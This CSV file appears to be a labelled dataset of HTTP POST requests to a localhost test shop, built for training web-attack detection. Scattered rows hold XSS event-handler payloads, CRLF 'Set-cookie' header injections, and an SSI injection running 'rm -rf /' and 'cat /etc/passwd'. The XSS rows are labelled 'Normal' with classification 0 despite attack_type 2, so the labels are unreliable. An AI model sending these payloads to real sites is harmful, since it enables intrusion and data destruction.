Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,length,content,classification,URL,attack_type
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5D2C45D95480E235810DE2545E8B64CE,application/x-www-form-urlencoded,Connection: close,Content-Length: 261,"modo=registro&login=jailyn&password=irado&nombre=S�ia&apellidos=Ar�n+Cantis�n&email=norring-fujikawa@autoconstruccion.au&dni=95944263Q&direccion=Plza.+Salamanca+39,+&ciudad=Langa+del+Castillo&cp=50780&provincia=Le�n&ntc=2787973107257855&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F2F48AE192E58860A9D42D9865FF1F1D,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=6351&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D4FFFBE82CEF5EAAE08329D789C0F287,application/x-www-form-urlencoded,Connection: close,Content-Length: 303,"modo=registro&login=antonin&password=sUpLiDora&nombre=any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235&apellidos=Giorgis+Zabala&email=merry@mcrspain.gg&dni=23625046K&direccion=Pla�a+Manuel+Corachan+S/N,+9A&ciudad=Coscurita&cp=08696&provincia=Lleida&ntc=1573270411029963&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=45F8750C4044B86395E441FFCBA0A2B5,application/x-www-form-urlencoded,Connection: close,Content-Length: 64,modo=entrar&login=slunder&pwd=50n165r7&remember=off&B1=Entrar+,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5441B7D745DAD28D36D5B9E412F388E7,application/x-www-form-urlencoded,Connection: close,Content-Length: 268,modo=registro&login=kimberly&password=semasiol�gico&nombreA=Nevio&apellidos=Lledos+Corvera&email=juergens-shear@imarbella.dm&dni=49100388B&direccion=C/+Pereiro+De+Aguiar+13+12-H&ciudad=Puebla+de+Lillo&cp=01470&provincia=Asturias&ntc=8464751915864337&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=30EA1C85B243DB93EE064C605BE71273,application/x-www-form-urlencoded,Connection: close,Content-Length: 264,"modo=registro&login=forslund&password=im$ponderable&nombre=Ravid&apellidos=Bonany+Lambarri&email=lightnin@grupodescansoyhogar.web&dni=70679983V&direccion=Calle+Barrio+Villayuda+169,+&ciudad=Ari�o&cp=08170&provincia=Segovia&ntc=0664227829030755&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=527FB101A79A5491E5B726D562E90FEB,application/x-www-form-urlencoded,Connection: close,Content-Length: 68,modo=entrar&login=mariana&pwd=emBlaNquImIentO&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F341F8E24142B0279B0993F7F0E928B6,application/x-www-form-urlencoded,Connection: close,Content-Length: 70,modo=entrar&login=t+'hain?e&pwd=Sur?TidO&remember=on&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5EEE23D928D262276CF0D13790FC25A9,application/x-www-form-urlencoded,Connection: close,Content-Length: 39,modo=insertar&precio=37&B1=Confirmar/,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7141FBA75F4409AFF12C380B60FCB87E,application/x-www-form-urlencoded,Connection: close,Content-Length: 256,"<fieldset onkeydown=""alert(1)"" contenteditable>test</fieldset>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1EDBB651C62F9DB073709085F1C780C5,application/x-www-form-urlencoded,Connection: close,Content-Length: 57,<figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A96DA69C22589F91CC83548B0E808665,application/x-www-form-urlencoded,Connection: close,Content-Length: 40,modo=insertar&precio=587&B1=Confirmar/,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=82ADF913A2396EB3BA18F7562EBC913D,application/x-www-form-urlencoded,Connection: close,Content-Length: 251,modo=registro&login=fernando&password=ARRUga4&nombre=Alfi&apellidos=Abaeto+Sanchon&email=cortland@tobarisch.bs&dni=67615328C&direccion=Ronda+Ambeles+62+8-D&ciudad=Santa+Maria+de+Merl�s&cp=18126&provincia=Barcelona&ntc=5326624144210576&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9B251ED52B9BFB482375B74980717A7E,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B4EE82C4EA296C0541CDC3C20E0B7C4B,application/x-www-form-urlencoded,Connection: close,Content-Length: 68,"<output onmouseenter=""alert(1)"">test</output>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5844B2E38308DAA2E68AC23CA4941B90,application/x-www-form-urlencoded,Connection: close,Content-Length: 59,"<hgroup oncopy=""alert(1)"" contenteditable>test</hgroup>",0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DC8B6B48DBED3E1978B96A5AADC66A9A,application/x-www-form-urlencoded,Connection: close,Content-Length: 59,"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=43CFA9FF237B57B387DE20DF48E09D19,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=3394&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=BAA9B26148EE62DA9F8AD425A4C5DE49,application/x-www-form-urlencoded,Connection: close,Content-Length: 62,modo=entrar&login=shing-mi&pwd=d9s1a1i89&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=876330F45BBAA542CE8FB11922CFFA7E,application/x-www-form-urlencoded,Connection: close,Content-Length: 42,modo=insertar&precio=847&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=3B94029EA30903F5460B2A035AA5C71D,application/x-www-form-urlencoded,Connection: close,Content-Length: 39,modo=insertar&precio=1106&B1A=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=09153C04FF05C2111A6D249DCA6ADCA6,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<dd onmousemove=""alert(1)"">test</dd>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=54782D122862A11FFE73110EB93E4F05,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,"<datalist onkeyup=""alert(1)"" contenteditable>test</datalist>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=622415E22154431E032E09EEBD57C8AF,application/x-www-form-urlencoded,Connection: close,Content-Length: 76,id=1/&nombre=Jam�n+Ib�rico&precio=39&cantidad=3&B1=A�adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F9A16C2F8E5D289EA1241AEBF6CD95C9,application/x-www-form-urlencoded,Connection: close,Content-Length: 256,modo=registro&login=bui&password=SoPorTador&nombre=Nu�o&apellidos=Trilles+Aedo&email=arena@productosgarantizados.uy&dni=79365532F&direccion=Calle+Siete+Cerros+144+&ciudad=Hornillos+del+Camino&cp=43896&provincia=Segovia&ntc=6613351872741676&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DBD0DA60B84D6615DD47C42428CF3B6D,application/x-www-form-urlencoded,Connection: close,Content-Length: 119,modo=entrar&login=dovel&pwd=theresa&remember=offany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4A6CDB02C438C2F6724693A0744C3CB5,application/x-www-form-urlencoded,Connection: close,Content-Length: 252,"modo=registro&login=damiano&password=EsCoGiDAMeNte&nombre=Vilmar&apellidos=Mateu+Bernaus&email=sheybal@cirugiaparpado.no&dni=75586196P&direccion=Travesia+Nardo+124,+7E&ciudad=Talav�n&cp=42311&provincia=C�ceres&ntcA=6955835443751937&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=23CD4EAA9B3EA885ED89B2C488775354,application/x-www-form-urlencoded,Connection: close,Content-Length: 302,"modo=registro&login=eshelman&password=fiLosOFAR&nombre=Zarif&apellidos=Torrabadella<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&email=cavender_jacob@9horas.uk&dni=73992011E&direccion=C/+Marbella+103+8A&ciudad=Artazu&cp=29532&provincia=Badajoz&ntc=1546173656033041&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=01EBE13B44CBC008027BB86B7AB34E09,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DAFAC380110C1FFF5C36237D422203CA,application/x-www-form-urlencoded,Connection: close,Content-Length: 72,<BODY ONLOAD=alert('')>,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F59821F2D79ABBED77E6263B7D02530A,application/x-www-form-urlencoded,Connection: close,Content-Length: 243,modo=registro&login=kirbie&password=men3pea&nombre=Quintina&apellidos=Atuesta+Venturi&email=kamel@hiperespa�a.hk&dni=28782294W&direccion=Passatge+De+Manyer+105+&ciudad=Tudanca&cp=25449&provincia=A+Coru�a&ntc=6905236399041419&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1605215617254FA9BBC6E4F37DC6CB3D,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=5705&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=964C7C74B79F6203ABB7DE5EFC6E9AC5,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=14D4F51D9C5A4BEFEAE56C532A499AEC,application/x-www-form-urlencoded,Connection: close,Content-Length: 253,"<frame onpaste=""alert(1)"" contenteditable>test</frame>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4A3DE893E6AD3C6E6A53BB5B79B11395,application/x-www-form-urlencoded,Connection: close,Content-Length: 58,modo=entrar&login=keehn&pwd=abogada&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C74FFF8F75476C21B85CDA475D90F809,application/x-www-form-urlencoded,Connection: close,Content-Length: 246,"<map oncontextmenu=""alert(1)"">test</map>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B793335DBF598DB903FCD94C108C1292,application/x-www-form-urlencoded,Connection: close,Content-Length: 260,"modo=registro&login=cowart&password=InoportunAMente&nombre=Cibeles&apellidos=Garrudo+Castellon&email=carminati@granbretana.com.uk&dni=33273113W&direccion=Calle+Pe�a+49,+9?B&ciudad=Mun�brega&cp=46970&provincia=Segovia&ntc=4611888318080805&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
